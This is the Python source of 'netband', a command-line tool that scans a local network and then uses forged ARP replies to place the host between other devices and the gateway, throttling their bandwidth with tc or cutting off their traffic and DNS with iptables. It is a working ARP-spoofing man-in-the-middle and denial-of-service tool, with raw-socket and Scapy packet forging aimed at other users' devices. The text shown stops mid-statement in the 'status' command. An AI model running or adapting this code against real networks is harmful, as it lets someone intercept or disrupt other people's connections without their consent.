#!/usr/bin/env python3
"""
netband - ARP-based local network bandwidth manager.
Usage: sudo netband [-i IFACE] [-g GW_IP] [-m GW_MAC] [--colorless] [-f]
"""

import os, sys, re, time, json, signal, argparse, threading, struct
import socket as _socket
from pathlib import Path

IS_ANDROID = os.path.exists("/system/build.prop") or "ANDROID_ROOT" in os.environ

try:
    from scapy.all import ARP, Ether, sendp, sr1
    import warnings; warnings.filterwarnings("ignore")
    SCAPY_OK = not IS_ANDROID
except ImportError:
    SCAPY_OK = False

BROADCAST = "ff:ff:ff:ff:ff:ff"
VERSION = "1.0"
TOOL_NAME = "netband"

# ── config ───────────────────────────────────────────────────────────

CONFIG_DIR = Path.home() / ".netctl"
DEVICES_FILE = CONFIG_DIR / "devices.json"
WATCH_FILE = CONFIG_DIR / "watch.json"

TC = "tc"
IPT = "iptables"
SYSCTL = "sysctl"
IP_FWD = "net.ipv4.ip_forward"

# ── colors ───────────────────────────────────────────────────────────

class C:
    RST="\033[0m"; RED="\033[91m"; GRN="\033[92m"; YEL="\033[93m"
    BLU="\033[94m"; CYN="\033[96m"; BLD="\033[1m"; DIM="\033[2m"
    MAG="\033[95m"

def no_color():
    for a in dir(C):
        if a.isupper(): setattr(C, a, "")

# ── shell ────────────────────────────────────────────────────────────

def sh(cmd):
    return os.popen(cmd).read().strip()

def shq(cmd):
    os.system(cmd + " 2>/dev/null")

# ── raw ARP (Android-safe) ───────────────────────────────────────────

def _arp_packet(src_mac, src_ip, dst_mac, dst_ip, op=2):
    """Build raw Ethernet+ARP frame using struct — no Scapy needed."""
    def mac2b(m):
        return bytes(int(x, 16) for x in m.split(":"))
    def ip2b(i):
        return _socket.inet_aton(i)
    eth = mac2b(dst_mac) + mac2b(src_mac) + b'\x08\x06'
    arp = struct.pack("!HHBBH", 0x0001, 0x0800, 6, 4, op)
    arp += mac2b(src_mac) + ip2b(src_ip) + mac2b(dst_mac) + ip2b(dst_ip)
    return eth + arp

def _send_raw_arp(iface, pkt):
    try:
        s = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW, _socket.htons(0x0806))
        s.bind((iface, 0))
        s.send(pkt)
        s.close()
    except Exception:
        pass  # requires root

# ── detection ────────────────────────────────────────────────────────

def detect_iface():
    m = re.search(r"dev\s+(\S+)", sh("ip route show default"))
    return m.group(1) if m else None

def detect_gw():
    m = re.search(r"via\s+(\S+)", sh("ip route show default"))
    return m.group(1) if m else None

def get_mac(ip, iface=None):
    # 1. ip neigh (fast, no root needed)
    out = sh(f"ip neigh show {ip}")
    m = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", out)
    if m: return m.group(1).lower()
    # 2. arping fallback (works on Android with root)
    iface_flag = f"-I {iface}" if iface else ""
    out2 = sh(f"arping -c 2 -f {iface_flag} {ip} 2>/dev/null")
    m2 = re.search(r"\[([0-9a-fA-F:]{17})\]", out2)
    if m2: return m2.group(1).lower()
    # 3. Scapy — desktop Linux only
    if SCAPY_OK:
        r = sr1(ARP(op=1, pdst=ip), timeout=3, verbose=0)
        return r.hwsrc.lower() if r else None
    return None

def get_local_ip(iface):
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", sh(f"ip -4 addr show dev {iface}"))
    return m.group(1) if m else None

def get_subnet(iface):
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", sh(f"ip -4 addr show dev {iface}"))
    if not m: return None, None
    return m.group(1), int(m.group(2))

def parse_rate(s):
    s = s.strip().lower()
    m = re.match(r"^(\d+(?:\.\d+)?)\s*(bit|kbit|mbit|gbit|kbps|mbps|gbps)?$", s)
    if not m: return None
    val = float(m.group(1))
    u = m.group(2) or "kbit"
    conv = {"kbps":"kbit","mbps":"mbit","gbps":"gbit"}
    return f"{val}{conv.get(u, u)}"

def _fmt(b):
    for u in ["B","KB","MB","GB"]:
        if abs(b) < 1024: return f"{b:.1f}{u}"
        b /= 1024
    return f"{b:.1f}TB"

# ── store ────────────────────────────────────────────────────────────

def load(p):
    return json.loads(p.read_text()) if p.exists() else {}

def save(p, d):
    CONFIG_DIR.mkdir(exist_ok=True)
    p.write_text(json.dumps(d, indent=2))

# ── direction helpers ────────────────────────────────────────────────

class Dir:
    NONE=0; UP=1; DOWN=2; BOTH=3
    @staticmethod
    def from_args(words):
        if "--upload" in words: return Dir.UP
        if "--download" in words: return Dir.DOWN
        return Dir.BOTH
    @staticmethod
    def name(d):
        return {1:"upload",2:"download",3:"both"}.get(d,"-")
    @staticmethod
    def icon(d):
        return {1:"\u2191", 2:"\u2193", 3:"\u2195"}.get(d, "-")

# ── ARP spoofer ──────────────────────────────────────────────────────

class Spoofer:
    def __init__(self, iface, gw_ip, gw_mac):
        self.iface = iface
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.local_ip = get_local_ip(iface)
        self.local_mac = get_mac(self.local_ip, iface)
        if not self.local_mac:
            try:
                self.local_mac = open(f"/sys/class/net/{iface}/address").read().strip()
            except Exception:
                self.local_mac = "00:00:00:00:00:00"
        self._targets = {}
        self._lock = threading.Lock()
        self._running = False
        self._thread = None
        self._fwd_orig = None

    def _start_thread(self):
        if self._running: return
        self._running = True
        self._fwd_orig = sh(f"{SYSCTL} -n {IP_FWD}")
        shq(f"{SYSCTL} -w {IP_FWD}=1")
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while self._running:
            with self._lock:
                targets = dict(self._targets)
            for ip, mac in targets.items():
                if not self._running: return
                self._send_spoof(ip, mac)
            time.sleep(2)

    def _send_spoof(self, ip, mac):
        if SCAPY_OK:
            sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, pdst=self.gw_ip,
                  hwdst=self.gw_mac, hwsrc=self.local_mac),
                  verbose=0, iface=self.iface)
            sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, pdst=ip,
                  hwdst=mac, hwsrc=self.local_mac),
                  verbose=0, iface=self.iface)
        else:
            # tell gateway: ip is at our mac
            _send_raw_arp(self.iface,
                _arp_packet(self.local_mac, ip, self.gw_mac, self.gw_ip))
            # tell target: gateway is at our mac
            _send_raw_arp(self.iface,
                _arp_packet(self.local_mac, self.gw_ip, mac, ip))

    def add(self, ip, mac):
        with self._lock:
            if ip in self._targets: return
            self._targets[ip] = mac
        self._start_thread()

    def remove(self, ip):
        with self._lock:
            mac = self._targets.pop(ip, None)
        if mac: self._restore(ip, mac)
        with self._lock:
            if not self._targets: self._stop()

    def _stop(self):
        self._running = False
        shq(f"{SYSCTL} -w {IP_FWD}={self._fwd_orig or '0'}")
        shq("conntrack -F 2>/dev/null")

    def _restore(self, ip, mac):
        for _ in range(5):
            if SCAPY_OK:
                sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, hwsrc=mac,
                      pdst=self.gw_ip, hwdst=BROADCAST),
                      verbose=0, iface=self.iface)
                sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, hwsrc=self.gw_mac,
                      pdst=ip, hwdst=BROADCAST),
                      verbose=0, iface=self.iface)
            else:
                # restore real MACs to both parties
                _send_raw_arp(self.iface,
                    _arp_packet(mac, ip, BROADCAST, self.gw_ip))
                _send_raw_arp(self.iface,
                    _arp_packet(self.gw_mac, self.gw_ip, BROADCAST, ip))
            time.sleep(0.1)

    def restore_all(self):
        with self._lock:
            targets = dict(self._targets)
            self._targets.clear()
        for ip, mac in targets.items():
            self._restore(ip, mac)
        self._stop()

    @property
    def count(self):
        with self._lock: return len(self._targets)

# ── tc + iptables limiter ────────────────────────────────────────────

class Limiter:
    def __init__(self, iface):
        self.iface = iface
        self._hosts = {}
        self._lock = threading.Lock()
        self._id_counter = 0

    def _next_id(self):
        self._id_counter += 1
        return self._id_counter

    def _ensure_root(self):
        if "htb" not in sh(f"{TC} qdisc show dev {self.iface}"):
            shq(f"{TC} qdisc add dev {self.iface} root handle 1:0 htb")

    def limit(self, ip, rate, direction):
        self._ensure_root()
        with self._lock:
            if ip in self._hosts: self._unlimit(ip)
            ids = {"uid": self._next_id(), "did": self._next_id()}
            self._hosts[ip] = {"ids": ids, "rate": rate, "dir": direction, "blocked": False}
        if direction & Dir.UP:
            uid = ids["uid"]
            shq(f"{TC} class add dev {self.iface} parent 1:0 classid 1:{uid} htb rate {rate} burst {rate}")
            shq(f"{TC} filter add dev {self.iface} parent 1:0 protocol ip prio {uid} handle {uid} fw flowid 1:{uid}")
            shq(f"{IPT} -t mangle -A POSTROUTING -s {ip} -j MARK --set-mark {uid}")
        if direction & Dir.DOWN:
            did = ids["did"]
            shq(f"{TC} class add dev {self.iface} parent 1:0 classid 1:{did} htb rate {rate} burst {rate}")
            shq(f"{TC} filter add dev {self.iface} parent 1:0 protocol ip prio {did} handle {did} fw flowid 1:{did}")
            shq(f"{IPT} -t mangle -A PREROUTING -d {ip} -j MARK --set-mark {did}")

    def block(self, ip, direction):
        self._ensure_root()
        with self._lock:
            if ip in self._hosts: self._unlimit(ip)
            ids = {"uid": self._next_id(), "did": self._next_id()}
            self._hosts[ip] = {"ids": ids, "rate": None, "dir": direction, "blocked": True}
        if direction & Dir.UP:
            shq(f"{IPT} -I FORWARD -s {ip} -j DROP")
            shq(f"{IPT} -I OUTPUT -s {ip} -j DROP")
        if direction & Dir.DOWN:
            shq(f"{IPT} -I FORWARD -d {ip} -j DROP")
            shq(f"{IPT} -I INPUT -d {ip} -j DROP")
        shq(f"{IPT} -I FORWARD -s {ip} -p udp --dport 53 -j DROP")
        shq(f"{IPT} -I FORWARD -d {ip} -p udp --dport 53 -j DROP")
        shq(f"{IPT} -I FORWARD -s {ip} -p tcp --dport 53 -j DROP")
        shq(f"{IPT} -I FORWARD -d {ip} -p tcp --dport 53 -j DROP")

    def unlimit(self, ip):
        with self._lock: self._unlimit(ip)

    def _unlimit(self, ip):
        info = self._hosts.pop(ip, None)
        if not info: return
        ids, direction = info["ids"], info["dir"]
        if info["rate"] is not None:
            if direction & Dir.UP:
                shq(f"{TC} filter del dev {self.iface} parent 1:0 prio {ids['uid']}")
                shq(f"{TC} class del dev {self.iface} parent 1:0 classid 1:{ids['uid']}")
                shq(f"{IPT} -t mangle -D POSTROUTING -s {ip} -j MARK --set-mark {ids['uid']}")
            if direction & Dir.DOWN:
                shq(f"{TC} filter del dev {self.iface} parent 1:0 prio {ids['did']}")
                shq(f"{TC} class del dev {self.iface} parent 1:0 classid 1:{ids['did']}")
                shq(f"{IPT} -t mangle -D PREROUTING -d {ip} -j MARK --set-mark {ids['did']}")
        else:
            if direction & Dir.UP:
                shq(f"{IPT} -D FORWARD -s {ip} -j DROP")
                shq(f"{IPT} -D OUTPUT -s {ip} -j DROP")
            if direction & Dir.DOWN:
                shq(f"{IPT} -D FORWARD -d {ip} -j DROP")
                shq(f"{IPT} -D INPUT -d {ip} -j DROP")
            shq(f"{IPT} -D FORWARD -s {ip} -p udp --dport 53 -j DROP")
            shq(f"{IPT} -D FORWARD -d {ip} -p udp --dport 53 -j DROP")
            shq(f"{IPT} -D FORWARD -s {ip} -p tcp --dport 53 -j DROP")
            shq(f"{IPT} -D FORWARD -d {ip} -p tcp --dport 53 -j DROP")

    def replace(self, old_ip, new_ip):
        with self._lock: info = self._hosts.get(old_ip)
        if not info: return
        rate, direction = info["rate"], info["dir"]
        self.unlimit(old_ip)
        if rate is None: self.block(new_ip, direction)
        else: self.limit(new_ip, rate, direction)

    def get_rate(self, ip):
        with self._lock: return self._hosts.get(ip, {}).get("rate")

    def is_blocked(self, ip):
        with self._lock: return self._hosts.get(ip, {}).get("blocked", False)

    def is_limited(self, ip):
        with self._lock: return ip in self._hosts

    def get_status(self, ip):
        with self._lock: return self._hosts.get(ip)

    def flush(self):
        shq(f"{TC} qdisc del dev {self.iface} root")
        shq(f"{IPT} -t mangle -F")
        shq(f"{IPT} -t filter -F FORWARD")
        shq(f"{IPT} -P FORWARD ACCEPT")

    @property
    def count(self):
        with self._lock: return len(self._hosts)

# ── scan ─────────────────────────────────────────────────────────────

def scan(iface, gw_ip, custom=None, limiter=None, spoofer=None, gw_mac=None):
    if custom:
        parts = custom.split("-")
        start, end = parts[0].strip(), parts[1].strip()
        if "." not in end:
            end = ".".join(start.split(".")[:-1]) + "." + end
        s, e = list(map(int, start.split("."))), list(map(int, end.split(".")))
        ips = []
        for a in range(s[0], e[0]+1):
            for b in range(s[1] if a==s[0] else 0, e[1]+1 if a==e[0] else 255):
                for c in range(s[2] if a==s[0] and b==s[1] else 0, e[2]+1 if a==e[0] and b==e[1] else 255):
                    for d in range(s[3] if a==s[0] and b==s[1] and c==s[2] else 1, e[3]+1 if a==e[0] and b==e[1] and c==e[2] else 255):
                        ips.append(f"{a}.{b}.{c}.{d}")
        ip_list = " ".join(ips)
    else:
        net = ".".join(gw_ip.split(".")[:3])
        ip_list = " ".join(f"{net}.{i}" for i in range(1, 255))

    print(f"{C.DIM}Scanning ...{C.RST}")
    # clear ARP cache for this interface
    sh(f"ip neigh flush dev {iface} nud failed nud incomplete 2>/dev/null")
    # ping sweep
    sh(f"for i in {ip_list}; do ping -c1 -W0.5 $i &>/dev/null & done; wait")
    time.sleep(0.5)

    devices = load(DEVICES_FILE)
    active_devices = {}

    # Pre-populate active_devices with hosts that are currently limited or blocked
    # so we don't discard them even if they are offline right now.
    for mac, d in devices.items():
        if limiter and limiter.is_limited(d["ip"]):
            d["online"] = False
            active_devices[mac] = d

    seen = set()

    # collect currently reachable MACs (only REACHABLE/DELAY/PROBE, not STALE)
    for line in sh(f"ip neigh show dev {iface}").splitlines():
        p = line.split()
        if len(p) < 4: continue
        ip, ll, mac, state = p[0], p[1], p[2], p[3]
        if ll != "lladdr": continue
        # only trust confirmed connections
        if state not in ("REACHABLE", "DELAY", "PROBE"): continue
        if mac == "00:00:00:00:00:00" or ":" not in mac: continue
        mac = mac.lower()
        if mac in seen: continue
        seen.add(mac)

        if mac in active_devices:
            active_devices[mac]["ip"] = ip
            active_devices[mac]["online"] = True
        elif mac in devices:
            active_devices[mac] = devices[mac]
            active_devices[mac]["ip"] = ip
            active_devices[mac]["online"] = True
        else:
            hn = ""
            try: hn = __import__("socket").gethostbyaddr(ip)[0]
            except: pass
            active_devices[mac] = {"id": -1, "ip": ip, "mac": mac, "hostname": hn, "limits": {}, "online": True}

    # Ensure Gateway is in active_devices
    if gw_mac:
        gw_mac_lower = gw_mac.lower()
        if gw_mac_lower not in active_devices:
            if gw_mac_lower in devices:
                active_devices[gw_mac_lower] = devices[gw_mac_lower]
                active_devices[gw_mac_lower]["ip"] = gw_ip
                active_devices[gw_mac_lower]["online"] = True
            else:
                active_devices[gw_mac_lower] = {
                    "id": 0,
                    "ip": gw_ip,
                    "mac": gw_mac_lower,
                    "hostname": "gateway",
                    "limits": {},
                    "online": True
                }

    # Re-index all active devices: Gateway gets ID 0, others sorted by IP numerically
    gw_device = None
    if gw_mac:
        gw_device = active_devices.pop(gw_mac.lower(), None)
    else:
        # search by IP if gw_mac is not supplied
        for mac, d in list(active_devices.items()):
            if d["ip"] == gw_ip:
                gw_device = active_devices.pop(mac)
                break

    def ip_key(item):
        try:
            return list(map(int, item[1]["ip"].split(".")))
        except:
            return [999, 999, 999, 999]

    sorted_non_gw = sorted(active_devices.items(), key=ip_key)

    rebuilt_devices = {}
    if gw_device:
        gw_device["id"] = 0
        # For the gateway, keep hostname as gateway or its resolved hostname
        if not gw_device["hostname"] or gw_device["hostname"] == gw_ip:
            gw_device["hostname"] = "gateway"
        rebuilt_devices[gw_device["mac"]] = gw_device
    elif gw_mac:
        rebuilt_devices[gw_mac.lower()] = {
            "id": 0,
            "ip": gw_ip,
            "mac": gw_mac.lower(),
            "hostname": "gateway",
            "limits": {},
            "online": True
        }

    for idx, (mac, d) in enumerate(sorted_non_gw, start=1):
        d["id"] = idx
        rebuilt_devices[mac] = d

    save(DEVICES_FILE, rebuilt_devices)
    return rebuilt_devices

# ── watch ────────────────────────────────────────────────────────────

def watch_check(iface, watchlist, devices, gw_ip):
    net = ".".join(gw_ip.split(".")[:3])
    sh(f"for i in $(seq 1 254); do ping -c1 -W0.2 {net}.$i &>/dev/null & done; wait")
    changes = []
    for mac in list(watchlist.get("hosts", [])):
        if mac not in devices: continue
        dev = devices[mac]
        old_ip = dev["ip"]
        for line in sh(f"ip neigh show dev {iface}").splitlines():
            p = line.split()
            if len(p) >= 4 and p[1] == "lladdr" and p[2].lower() == mac and p[3] not in ("FAILED","INCOMPLETE","NONE"):
                new_ip = p[0]
                if new_ip != old_ip:
                    changes.append((mac, dev.get("hostname",""), old_ip, new_ip))
                    dev["ip"] = new_ip
    if changes: save(DEVICES_FILE, devices)
    return changes

# ── monitor ──────────────────────────────────────────────────────────

def get_traffic():
    d = {}
    try:
        for line in Path("/proc/net/dev").read_text().splitlines()[2:]:
            p = line.split()
            if len(p) >= 10: d[p[0].rstrip(":")] = {"rx": int(p[1]), "tx": int(p[9])}
    except: pass
    return d

def get_tc_stats(iface):
    out = sh(f"{TC} -s class show dev {iface}")
    r = {}
    for m in re.finditer(r"class htb 1:(\d+).*?Sent\s+(\d+)\s+bytes.*?rate\s+(\S+)", out, re.DOTALL):
        r[int(m.group(1))] = {"bytes": int(m.group(2)), "rate": m.group(3)}
    return r

# ── parse IDs ────────────────────────────────────────────────────────

def parse_ids(raw, devices):
    if raw.strip().lower() == "all":
        return list(devices.values())
    out = []
    for part in raw.split(","):
        part = part.strip()
        if "-" in part:
            lo, hi = part.split("-", 1)
            for i in range(int(lo), int(hi)+1):
                for d in devices.values():
                    if d["id"] == i: out.append(d)
        else:
            n = int(part)
            for d in devices.values():
                if d["id"] == n: out.append(d)
    return out

# ── banner ───────────────────────────────────────────────────────────

def print_banner(iface, gw_ip, gw_mac, local_ip):
    mode = f" {C.YEL}[Android/raw-socket mode]{C.RST}" if IS_ANDROID else ""
    print("")
    print(f"""{C.RED}   ███╗  ██╗███████╗████████╗██████╗  █████╗ ███╗  ██╗██████╗
   ████╗ ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗ ██║██╔══██╗
   ██╔██╗██║█████╗     ██║   ██████╔╝███████║██╔██╗██║██║  ██║
   ██║╚████║██╔══╝     ██║   ██╔══██╗██╔══██║██║╚████║██║  ██║
   ██║ ╚███║███████╗   ██║   ██████╔╝██║  ██║██║ ╚███║██████╔╝
   ╚═╝  ╚══╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚══╝╚═════╝{C.RST}
   {C.DIM}by Elvan ~ limit devices on your network    v{VERSION}{C.RST}
  {C.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RST}
   {C.CYN}Interface:{C.RST} {iface}    
   {C.CYN}Local IP:{C.RST}  {local_ip}
   {C.CYN}Gateway:  {C.RST} {gw_ip} ({gw_mac}){mode}
  {C.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RST}
""")

# ── help ─────────────────────────────────────────────────────────────

def print_help():
    print(f"""
{C.BLD}Commands:{C.RST}
  {C.CYN}scan{C.RST} [--range IP-IP]       Scan network for hosts
  {C.CYN}hosts{C.RST} [--force]             Show discovered hosts
  {C.CYN}limit{C.RST} IDs RATE [--upload|--download]
  {C.CYN}block{C.RST} IDs [--upload|--download]
  {C.CYN}free{C.RST} IDs|all                Remove limits/blocks
  {C.CYN}add{C.RST} IP [--mac MAC]          Add custom host
  {C.CYN}monitor{C.RST} [--interval MS]    Monitor limited hosts
  {C.CYN}analyze{C.RST} IDs [--duration S] Analyze without limiting
  {C.CYN}status{C.RST}                      Show active limits/blocks
  {C.CYN}watch{C.RST}                       Show watch status
  {C.CYN}watch add{C.RST} IDs              Add hosts to watchlist
  {C.CYN}watch remove{C.RST} IDs|all       Remove from watchlist
  {C.CYN}watch set{C.RST} ATTR VAL         Set watch attribute
  {C.CYN}clear{C.RST}                      Clear terminal
  {C.CYN}help{C.RST}                       Show this help
  {C.CYN}quit{C.RST}                       Exit (auto-cleanup)

  Rates: {C.YEL}bit, kbit, mbit, gbit{C.RST}
  Example: {C.DIM}limit 1,2,3 200kbit --download{C.RST}
""")

# ── table printer ────────────────────────────────────────────────────

def _print_host_table(devices, gw_ip, limiter):
    hdr = f"{'ID':<4} {'IP':<16} {'MAC':<18} {'HOSTNAME':<24} {'STATUS':<14}"
    print(f"{C.CYN}{hdr}{C.RST}")
    print(C.DIM + "-" * len(hdr.replace(C.CYN,"").replace(C.RST,"")) + C.RST)
    for mac, d in sorted(devices.items(), key=lambda x: x[1]["id"]):
        is_gw = d["ip"] == gw_ip
        is_online = d.get("online", True)
        info = limiter.get_status(d["ip"])
        if is_gw:
            status = f"{C.MAG}gateway{C.RST}"
        elif not is_online:
            if info:
                if info["blocked"]:
                    status = f"{C.DIM}offline {C.RED}(blocked){C.RST}"
                else:
                    status = f"{C.DIM}offline {C.YEL}({info['rate']}){C.RST}"
            else:
                status = f"{C.DIM}offline{C.RST}"
        elif info:
            if info["blocked"]:
                status = f"{C.RED}blocked {Dir.icon(info['dir'])}{C.RST}"
            else:
                status = f"{C.YEL}{info['rate']} {Dir.icon(info['dir'])}{C.RST}"
        else:
            status = f"{C.GRN}online{C.RST}"
        ip = d["ip"].ljust(15)
        if is_gw: ip = f"{C.MAG}{ip}{C.RST}"
        mac_s = d["mac"].ljust(17)
        hn = d["hostname"][:23].ljust(23)
        print(f" {d['id']:<3} {ip}  {mac_s} {hn}  {status}")

# ── main ─────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="netband - ARP-based bandwidth manager")
    ap.add_argument("-i", help="interface")
    ap.add_argument("-g", help="gateway IP")
    ap.add_argument("-m", help="gateway MAC")
    ap.add_argument("-n", help="netmask")
    ap.add_argument("-f", action="store_true", help="flush tc/iptables")
    ap.add_argument("--colorless", action="store_true")
    args = ap.parse_args()

    if args.colorless: no_color()

    iface = args.i or detect_iface()
    gw_ip = args.g or detect_gw()
    gw_mac = args.m or (get_mac(gw_ip, iface) if gw_ip else None)

    if not iface: print(f"{C.RED}No interface. Use -i.{C.RST}"); sys.exit(1)
    if not gw_ip: print(f"{C.RED}No gateway. Use -g.{C.RST}"); sys.exit(1)
    if not gw_mac: print(f"{C.RED}No gateway MAC. Use -m.{C.RST}"); sys.exit(1)

    if args.f:
        Limiter(iface).flush()
        print(f"{C.GRN}Flushed.{C.RST}"); return

    if os.geteuid() != 0:
        print(f"{C.RED}Must run as root.{C.RST}"); sys.exit(1)

    spoofer = Spoofer(iface, gw_ip, gw_mac)
    limiter = Limiter(iface)
    local_ip = get_local_ip(iface)

    print_banner(iface, gw_ip, gw_mac, local_ip)

    devices = load(DEVICES_FILE)
    watchlist = load(WATCH_FILE)
    for k, v in [("hosts",[]), ("range",""), ("interval",120)]:
        if k not in watchlist: watchlist[k] = v

    try:
        import readline
        hist = CONFIG_DIR / "history"
        CONFIG_DIR.mkdir(exist_ok=True)
        if hist.exists(): readline.read_history_file(str(hist))
        readline.set_history_length(1000)
        import atexit
        atexit.register(readline.write_history_file, str(hist))
    except: pass

    def cleanup(*_):
        print(f"\n{C.YEL}Restoring ARP, cleaning up...{C.RST}")
        spoofer.restore_all()
        limiter.flush()
        print(f"{C.GRN}Done.{C.RST}"); sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    while True:
        try:
            line = input(f"{C.GRN}>{C.RST} ").strip()
        except (EOFError, KeyboardInterrupt):
            cleanup(); break
        if not line: continue

        parts = line.split(None, 1)
        cmd, arg = parts[0].lower(), parts[1] if len(parts) > 1 else ""

        if cmd in ("help", "?"):
            print_help()

        elif cmd == "scan":
            custom = arg.split("--range",1)[1].strip() if "--range" in arg else None
            devices = scan(iface, gw_ip, custom, limiter, spoofer, gw_mac)
            print(f"\n{C.BLD}Found {len(devices)} hosts:{C.RST}")
            _print_host_table(devices, gw_ip, limiter)

        elif cmd == "hosts":
            if not devices:
                print(f"{C.DIM}No hosts. Run 'scan'.{C.RST}"); continue
            _print_host_table(devices, gw_ip, limiter)

        elif cmd == "limit":
            if not arg:
                print(f"{C.RED}Usage: limit IDs RATE [--upload|--download]{C.RST}"); continue
            w = arg.split()
            ids_s, rate_s = w[0], w[1] if len(w) > 1 else ""
            direction = Dir.from_args(w)
            m = re.match(r"^(\d+(?:\.\d+)?)\s*(bit|kbit|mbit|gbit|kbps|mbps|gbps)?$", rate_s.lower())
            if not m:
                print(f"{C.RED}Invalid rate.{C.RST}"); continue
            val = float(m.group(1))
            u = m.group(2) or "kbit"
            conv = {"kbps":"kbit","mbps":"mbit","gbps":"gbit"}
            rate = f"{val}{conv.get(u, u)}"
            devs = parse_ids(ids_s, devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue
            for d in devs:
                if d["ip"] == gw_ip: continue
                spoofer.add(d["ip"], d["mac"])
                limiter.limit(d["ip"], rate, direction)
                d["limits"] = {"rate": rate, "direction": direction}
            save(DEVICES_FILE, devices)
            ips = ", ".join(d["ip"] for d in devs if d["ip"] != gw_ip)
            print(f"{C.GRN}Limited {ips} to {rate} ({Dir.name(direction)}){C.RST}")

        elif cmd == "block":
            if not arg:
                print(f"{C.RED}Usage: block IDs [--upload|--download]{C.RST}"); continue
            w = arg.split()
            direction = Dir.from_args(w)
            devs = parse_ids(w[0], devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue
            for d in devs:
                if d["ip"] == gw_ip: continue
                spoofer.add(d["ip"], d["mac"])
                limiter.block(d["ip"], direction)
                d["limits"] = {"rate": None, "direction": direction, "blocked": True}
                print(f"{C.RED}Blocked {d['ip']}{C.RST}")
            save(DEVICES_FILE, devices)

        elif cmd == "free":
            if not arg:
                print(f"{C.RED}Usage: free IDs|all{C.RST}"); continue
            devs = parse_ids(arg.split()[0], devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue
            for d in devs:
                limiter.unlimit(d["ip"])
                spoofer.remove(d["ip"])
                d["limits"] = {}
                print(f"{C.GRN}Freed {d['ip']}{C.RST}")
            save(DEVICES_FILE, devices)

        elif cmd == "add":
            if not arg:
                print(f"{C.RED}Usage: add IP [--mac MAC]{C.RST}"); continue
            w = arg.split()
            ip = w[0]
            mac = get_mac(ip, iface) if "--mac" not in w else w[w.index("--mac")+1]
            if not mac:
                print(f"{C.RED}Cannot resolve MAC.{C.RST}"); continue
            mac = mac.lower()
            idx = max((d["id"] for d in devices.values()), default=0) + 1
            hn = ""
            try: hn = __import__("socket").gethostbyaddr(ip)[0]
            except: pass
            devices[mac] = {"id": idx, "ip": ip, "mac": mac, "hostname": hn, "limits": {}}
            save(DEVICES_FILE, devices)
            print(f"{C.GRN}Added {ip} ({mac}) as ID {idx}{C.RST}")

        elif cmd == "monitor":
            interval = 0.5
            if "--interval" in arg:
                ms = arg.split("--interval")[1].strip()
                interval = int(ms)/1000 if ms.isdigit() else 0.5
            limited = {d["ip"]: d for d in devices.values() if limiter.is_limited(d["ip"])}
            if not limited:
                print(f"{C.DIM}No limited hosts.{C.RST}"); continue
            print(f"{C.BLD}Monitoring (Ctrl+C to stop)...{C.RST}")
            prev = get_traffic()
            prev_time = time.time()
            try:
                while True:
                    time.sleep(interval)
                    now = time.time()
                    dt = now - prev_time
                    curr = get_traffic()
                    tc = get_tc_stats(iface)
                    print(f"\n{C.CYN}{'ID':<4} {'IP':<16} {'Rate':>10} {'RX/s':>10} {'TX/s':>10} {'Total RX':>10} {'Total TX':>10}{C.RST}")
                    print("-" * 80)
                    for ip, d in limited.items():
                        rate = limiter.get_rate(ip) or "blocked"
                        iface_rx = curr.get(iface,{}).get("rx",0) - prev.get(iface,{}).get("rx",0)
                        iface_tx = curr.get(iface,{}).get("tx",0) - prev.get(iface,{}).get("rx",0)
                        rx = _fmt(iface_rx / dt) if dt > 0 else "?"
                        tx = _fmt(iface_tx / dt) if dt > 0 else "?"
                        tot_rx = _fmt(curr.get(iface,{}).get("rx",0))
                        tot_tx = _fmt(curr.get(iface,{}).get("tx",0))
                        print(f"{d['id']:<4} {ip:<16} {rate:>10} {rx:>10} {tx:>10} {tot_rx:>10} {tot_tx:>10}")
                    prev = curr
                    prev_time = now
            except KeyboardInterrupt:
                print(f"\n{C.DIM}Stopped.{C.RST}")

        elif cmd == "analyze":
            if not arg:
                print(f"{C.RED}Usage: analyze IDs [--duration S]{C.RST}"); continue
            w = arg.split()
            duration = 30
            if "--duration" in w:
                di = w[w.index("--duration")+1]
                duration = int(di) if di.isdigit() else 30
            devs = parse_ids(w[0], devices)
            if not devs:
                print(f"{C.RED}No matching hosts.{C.RST}"); continue
            print(f"{C.BLD}Analyzing {len(devs)} host(s) for {duration}s ...{C.RST}")
            prev = get_traffic()
            start = time.time()
            try:
                while time.time() - start < duration:
                    time.sleep(2)
                    curr = get_traffic()
                    elapsed = time.time() - start
                    dt = elapsed - (elapsed - 2) if elapsed > 2 else 2
                    print(f"\n{C.CYN}[{elapsed:.0f}s] {'ID':<4} {'IP':<16} {'Hostname':<20} {'RX/s':>10} {'TX/s':>10}{C.RST}")
                    print("-" * 66)
                    if iface in prev and iface in curr:
                        total_rx = curr[iface]["rx"] - prev[iface]["rx"]
                        total_tx = curr[iface]["tx"] - prev[iface]["tx"]
                        for d in devs:
                            print(f"    {d['id']:<4} {d['ip']:<16} {d['hostname'][:20]:<20} {'-':>10} {'-':>10}")
                        print(f"{C.DIM}Total: RX {_fmt(total_rx/dt)}/s  TX {_fmt(total_tx/dt)}/s{C.RST}")
                    prev = curr
            except KeyboardInterrupt: pass
            print(f"\n{C.DIM}Done.{C.RST}")

        elif cmd == "status":
            if not limiter.count:
